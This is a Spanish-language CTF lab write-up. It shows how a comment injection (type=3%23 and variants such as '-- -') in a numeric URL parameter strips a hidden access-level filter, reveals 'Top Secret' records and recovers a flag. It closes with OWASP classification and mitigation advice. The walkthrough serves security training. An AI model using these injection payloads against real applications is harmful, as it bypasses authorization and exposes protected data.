# Lab: NSA

**Plataforma:** Software Seguro (softwareseguro.com.ar)
**Categoría:** SQLi (SQL Injection)
**Objetivo del lab:** Acceder a los proyectos de tipo "APT" (Advanced Persistent Threat), que tienen nivel de acceso "Top Secret" y por eso el agente no puede ver.

---

## 1. Reconocimiento

La aplicación (una simulación de la "NSA") muestra una lista de proyectos con un **filtro por tipo de proyecto** (un desplegable + botón "Filter search").

Al usar el filtro, el frontend llama a una API:

```
GET /backend/index.php?type=<N>
```

Explorando los valores del parámetro `type` (numérico):

| `type` | Categoría | Resultado |
|---|---|---|
| 1 | Targeted attack | 1 proyecto (Restricted) |
| 2 | Spying | 2 proyectos (Secret, Restricted) |
| 3 | **APT** | **"No results"** → `{"status":"ok","data":{"projects":[]}}` |

Observación clave: **en ninguna categoría aparecen proyectos de nivel "Top Secret"**; solo se ven "Restricted" y "Secret". Y la categoría APT (type 3) devuelve siempre vacío. Esto sugiere que el backend aplica un **filtro oculto de nivel de acceso** en la consulta, algo como:

```sql
SELECT code, name, type, level, owner
FROM projects
WHERE type = <input> AND level != 'Top Secret';
```

Como los proyectos APT son todos "Top Secret", el `AND level != 'Top Secret'` los elimina siempre.

## 2. Identificación del punto de inyección

El parámetro **`type`** se inserta directamente en la query (sin parametrizar). Al ser un valor **numérico** controlado por el cliente, es el punto de inyección. El objetivo no es extraer datos de otra tabla, sino **anular el filtro de nivel de acceso** para que la consulta devuelva también los proyectos Top Secret.

## 3. Explotación

Se inyectó un **comentario SQL** en el parámetro `type` para descartar todo lo que viene después (incluido el filtro de `level`).

Petición enviada (en la barra de direcciones del navegador / Burp):

```
GET /backend/index.php?type=3%23
```

- `%23` es la **codificación URL del carácter `#`**. Se codifica porque un `#` literal en la URL lo interpreta el navegador como fragmento (ancla) y no se envía al servidor; `%23` garantiza que el `#` llegue dentro del parámetro.
- En **MySQL, `#` es un carácter de comentario**: todo lo que le sigue en esa línea SQL se ignora.

La consulta efectiva que ejecutó el servidor quedó:

```sql
SELECT ... FROM projects WHERE type = 3#  AND level != 'Top Secret';
                                      └── comentado, se ignora ──┘
```

Es decir, se transformó en:

```sql
SELECT ... FROM projects WHERE type = 3;
```

Sin el filtro `AND level != 'Top Secret'`, la consulta devolvió **todos** los proyectos de tipo APT, incluidos los ocultos.

(Variantes equivalentes: `type=3'%23` si el campo fuera string, y `type=3-- -` usando el comentario `-- ` en lugar de `#`.)

## 4. Resultado

Respuesta del servidor:

```json
{"status":"ok","data":{"projects":[
  {"code":"NS4_B2W","name":"Terrorists - 141e9ea9d1c4ade203ffe3ee03ebff1c","type":"APT","level":"Top Secret","owner":"Brian"},
  {"code":"NS4_OIL","name":"EkoParty destruction","type":"APT","level":"Top Secret","owner":"Eric"}
]}}
```

Aparecieron los dos proyectos **APT / Top Secret** que estaban ocultos por el filtro.

**Flag obtenida:** `141e9ea9d1c4ade203ffe3ee03ebff1c` (embebida en el nombre del proyecto `NS4_B2W`).

## 5. Clasificación OWASP

| Vulnerabilidad | Categoría OWASP |
|---|---|
| Inyección SQL en el parámetro `type` (input concatenado en la query) | A03 — Injection |
| El control de acceso ("no mostrar Top Secret") se implementa dentro de una query manipulable | A01 — Broken Access Control |

## 6. Lecciones / notas para el reporte final

- La causa raíz es la **concatenación de input del usuario en la consulta SQL** sin consultas parametrizadas. Al poder inyectar un comentario (`#` / `-- `), el atacante **anula las condiciones de seguridad** que vienen después en el `WHERE`.
- **Comentar la query** es una de las técnicas más simples de SQLi: no hace falta un `UNION` ni extraer datos de otras tablas; con solo descartar el resto de la condición se saltan filtros de autorización.
- **Codificación URL:** caracteres como `#` (`%23`), espacio (`%20`) o comilla (`%27`) deben codificarse para que lleguen intactos al backend dentro de un parámetro de URL.
- **Mitigación:** usar **consultas parametrizadas (prepared statements)**, que impiden que el input se interprete como SQL (ver Objetivo 3 teórico). Además, el control de acceso no debería depender de una condición embebida en una query inyectable, sino aplicarse de forma robusta del lado del servidor según los permisos reales del usuario.
